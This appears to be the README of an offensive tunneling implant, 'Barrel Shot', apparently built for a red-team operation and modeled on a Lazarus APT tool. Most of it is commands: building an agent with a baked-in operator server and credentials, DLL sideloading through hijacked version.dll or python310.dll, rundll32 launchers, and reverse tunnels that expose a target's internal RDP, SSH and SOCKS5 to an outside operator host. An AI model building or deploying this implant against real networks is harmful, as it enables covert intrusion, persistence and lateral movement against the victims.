# Barrel Shot

RDP/SSH tunneling tool for Operation Triple Barrel. SSH-over-WebSocket reverse tunnel, modeled after Hookshot (Lazarus APT) with patterns from chisel.

## Dependencies

```sh
sudo apt update -y
sudo apt install -y make golang-go mingw-w64
```

## Build

Requires Go 1.22+

```sh
# server + agent (no embedded config)
make all

# agent with baked-in config - runs with just `barrel-shot.exe agent`
make agent \
  SERVER=https://operator.com:443 \
  AUTH=op:s3cret \
  REMOTES=R:13389:10.10.5.50:3389,R:socks \
  TLS_SKIP=1
```

### DLL Sideload

```sh
# DllMain trigger (default) - agent starts on DLL load
make dll \
  PROXY=./version.dll \
  SERVER=https://operator.com:443 \
  AUTH=op:s3cret \
  REMOTES=R:13389:10.10.5.50:3389,R:socks \
  TLS_SKIP=1

# Specific exported function trigger - agent starts when specific function called
make dll \
  PROXY=./python310.dll \
  FUNCTION=Py_Main \
  SERVER=https://operator.com:443 \
  AUTH=op:s3cret \
  REMOTES=R:13389:10.10.5.50:3389,R:socks \
  TLS_SKIP=1
```

- Output DLL: PROXY 
- Original DLL: Original DLL with `_` suffix (ex. `version.dll` -&gt; `version_.dll`)
- `**FUNCTION=DllMain**`: agent starts in background, DLL load returns immediately.
- `**FUNCTION=<export>**`: agent starts in background, trigger function calls the real export then blocks (`Sleep(INFINITE)`) to keep the process alive.

## Quick Start

```sh
# start server (operator side)
barrel-shot server -l 0.0.0.0:8443 --auth op:s3cret

# connect agent (target side) - forward RDP + SSH + SOCKS5
barrel-shot agent \
  --auth op:s3cret \
  --tls-skip-verify \
  https://operator:8443 \
  R:13389:10.10.5.50:3389 \
  R:12222:10.10.5.50:22 \
  R:socks
```

## Troubleshooting - manual invocation for dll

```sh
rundll32 version.dll,RunAgent       # explicit start (blocking)
rundll32 version.dll,GoNow          # explicit start (non-blocking)
rundll32 version.dll,ServiceMain    # service registration
```

## Tunnel Syntax

```
R:<listen-port>:<target-host>:<target-port>    # reverse port forward
R:<listen-host>:<listen-port>:<target-host>:<target-port>
R:socks                                        # reverse SOCKS5 (default :1080)
R:<port>:socks                                 # reverse SOCKS5 on custom port
```

